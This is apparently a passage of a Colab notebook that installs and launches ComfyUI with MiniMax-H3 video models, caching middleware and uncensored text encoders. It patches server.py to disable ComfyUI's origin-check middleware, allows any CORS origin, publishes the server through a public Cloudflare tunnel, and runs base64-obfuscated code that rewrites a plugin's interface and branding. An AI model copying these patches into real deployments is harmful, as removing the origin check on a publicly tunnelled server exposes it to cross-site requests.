bL9yGIc+8IQBC9iqL5SiQ0meMRnW6FVqndGMwy0CY6opAB+0XT9o1XV7qmgRtF3aczHMxoGbJj+OsFrorQSg8HjHDsh2sW8kLkTw/1s1ruFXNhDS2x/DxLNFSwGw33T2iEe9WBiugWaj+0Y6ZFoNmS8QYT9Iw8PyxPdT/Qnl16O1MO0PbRUDcftqFynNHrFejST/MTne6sYLiXc49ikz8cKCzFdYG9rlEsWARUtcC91eAhMsDoust7IMw5ugP8nOUeXjOHESFgQRsRFywyAHhcqQ1h+aBpM9SZufSlU8Khr9PAU+EJKyh5sqblKU9sGt5IiQQCBOeQS5dw37RZFg3tGKS3VXUg6wMPlJTlxXF9geGYYJXAmmxg1HsLYPfGEeKNicRgo5CYGlIJZJ+Br5Pxzj5Nf+WIy3J0u0WK8PJzmStoaY6RS1cvfsX5MhkYHMIMuBybdsZC49VmkTY3xcCmJdiz8oPshLMbaH/dReVs17dVwrxkuBdhMOL7js0Xh2NhPW3UJbnIhdMe3LikMZTYAMQAVUkRIsoBQlCjLkoAnTpK3D9Oj1HjSvPeYwsDx8ODIwPcPGtkxr6dJYUwZjXktfyTTuATCN//LZZkc+q56/QKGmKcI6dILzPQvl31yYZ/3a/AGLqHc0ktzO+yZ7j/FG7RvMjwVElFS7nATSryhRPgD4Q+vqYgsalxXbHozs4uW2RccI9zTEtt3TeKJyJ8T+FhLQhl967iQ6kc0KlAcSzK9uaqwGpCm6+GIfiOPdT4D5+XuyEAiusa3CJluzKOgRTvjTFUt7FUvha3tlaMNCGwib92IKHhBKKBUmbAUZmEsPaOPfmox0RM9UZifWrxEgo0WMJGzZKoCCS7xjQptxaUtzLGhK9U5s9cbuKwUOW9ixQ2dQo09gTsIT+AuysJy4DtF1TJbNv65dej7nuDY2Oy5yS4gqpofQFI2QccQ4qASA1B6NUt4VFjd3LgSQucU3TQMRR93lwshAiyhFTaQzymaZXbHT/JhLSpUHuIOnc2ZHr3UxQgP3UPm7xj+8NiuXUPKtK1j0MVHb4h5jguZQUxcFOM4C7igsm+HsYO6Z/rEVui9jugkypBBk+DbHMJ2NP8ZNeut6ys68d3R1/sR1yjGJGxzcSdmu9azlEYzizLqOlQZVW7ISfxeqeYrHYl90uuOfML18r40mADfcvGgp/R19k8ojFgdzyJLvBgpRT5Jr5+GoH0j+tv+oSt0Kc7R11Ou2TEWDHvkfmAqdIgZJsRViv9qSFyXg2NIBExY+OQXL9x798sEwHxml1vpp1y87mNu6IeXrlNbvllXBwd4DRpZgG0Z79WLLG70u1kn14Xx6PAaMF6CRuUBGoPdbKfH7YDt+v595rOLtC2uDzaZphb6t5uIAnIcG/aCJs0KHO94MQe8YRbHS9hA5Zy8oQcrWjtx/2asHMyTKNUJuKN3LjwfUx9jDHM0uvj9dM7M2KP3RdjM5Kla/v7T0ZGRPkTca1tru5sO/lVCnrqp6dEob2PG6fckaljmwBZ1lF4Bd/IVFgr6PTzbCx2aL/r7y84lwLmLPHgsxNQdXTgZ98OuKHEhMAc9PCGGotvkUmgPJgX7RxjWVO9ovXZ+aWp0REy3Cf0rDHhTHRW0cB5JJfpZ4Z/Vgf2koSTw8DRB/1GK86ujOok6Kg9JHcNqeEDx61qtUjdqlSLRdLVYb5YbRZXMNYqGqjbVStOYqdSM8+hidqCL6UxdzDyQLqa5LmYeUBeoBQY9QQilWUwPOl3MPJIQS2Wp5S8O4cZaUT3NNNnfkeCGWod6YrGaHTUnuzWfuK/0fygh4CE=")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()

from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 FastH3-Omni 实时全参模式（41G 原生8步满血版 + 13G Blackwell版）已就绪！")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)
display(HTML(f'''
<div style="padding:18px;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);border:2px solid #00e676;border-radius:12px;color:#fff;font-family:sans-serif;margin-top:8px;">
  <h3 style="margin:0 0 10px 0;color:#00e676;">⚡ FastH3-Omni 实时全参模式（41G 原生8步满血版 + 13G Blackwell版）已启动！</h3>
  <p style="margin:0 0 12px 0;font-size:14px;color:#cfd8dc;">已挂载：<b>{target_model_bf16}</b> & <b>{target_model_fp4}</b> | 专属工作流池：<b>Omni_* (原生8步直出，已自动旁路多余加速LoRA)</b></p>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:12px 26px;background:#00e676;color:#000;font-weight:bold;font-size:16px;border-radius:8px;text-decoration:none;box-shadow:0 4px 12px rgba(0,230,118,0.4);">🌐 点击打开 ComfyUI (Cloudflare 免403直连)</a>
</div>
'''))
try:
    from google.colab import output
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

In [ ]:
# @title 🌟 5. C站 MiniMax-H3 Remix 选项（64G社区二合一底模 + 25G未删减CLIP）
import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
Remix底模精度变体 = "BF16 满血版 (64G · 画质与细节最强，推荐)"

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
lora_dir = "/content/ComfyUI/models/loras"
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)
os.makedirs(lora_dir, exist_ok=True)

if "BF16" in Remix底模精度变体:
    target_model = "【64G满血-C站Remix二合一】FeiHou_MiniMax-H3_Remix_v0.6_bf16.safetensors"
    model_url = "https://huggingface.co/FX-FeiHou/MiniMax-H3-Remix/resolve/main/FeiHou_MiniMax-H3_Remix_v0.6.safetensors"
else:
    target_model = "【31G极速-C站Remix二合一】FeiHou_MiniMax-H3_Remix_v0.6_int8_convrot.safetensors"
    model_url = "https://huggingface.co/FX-FeiHou/MiniMax-H3-Remix/resolve/main/FeiHou_MiniMax-H3_Remix_v0.6_int8_convrot_v2.safetensors"

轻量化CLIP选择 = "25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)"
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in os.listdir(diff_dir):
    if f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(os.path.join(diff_dir, f))
for f in os.listdir(clip_dir):
    if f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(os.path.join(clip_dir, f))

print(f"⏳ 正在检查/下载 C站社区版 MiniMax-H3 Remix 主底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "--user-agent=Mozilla/5.0", "-d", diff_dir, "-o", target_model, model_url
], check=True)

print(f"⏳ 正在检查/下载 C站社区版配套未删减版 CLIP (fileId=3137729): {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "--user-agent=Mozilla/5.0", "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        os.unlink(_p)
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _pool = "/content/lora_pool_qwen" if ("千问" in _f or "Qwen" in _f or "qwen" in _f or "Anime2Real" in _f or "2anime" in _f) else "/content/lora_pool_h3"
        os.replace(_p, os.path.join(_pool, _f))
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        os.symlink(os.path.join("/content/lora_pool_h3", _f), os.path.join(_lora_active, _f))
print("🧹 已切换为【H3视频专属LoRA与工作流配置】")

wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json") and ("qwen" in _wf.lower() or "千问" in _wf):
        os.replace(os.path.join(wf_dir, _wf), os.path.join("/content/wf_pool_qwen", _wf))
import shutil as _sh
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not os.path.exists(os.path.join(wf_dir, _wf)):
        _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), os.path.join(wf_dir, _wf))
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
ONE_DAY: int = 86400
IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
        return response
    if request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCI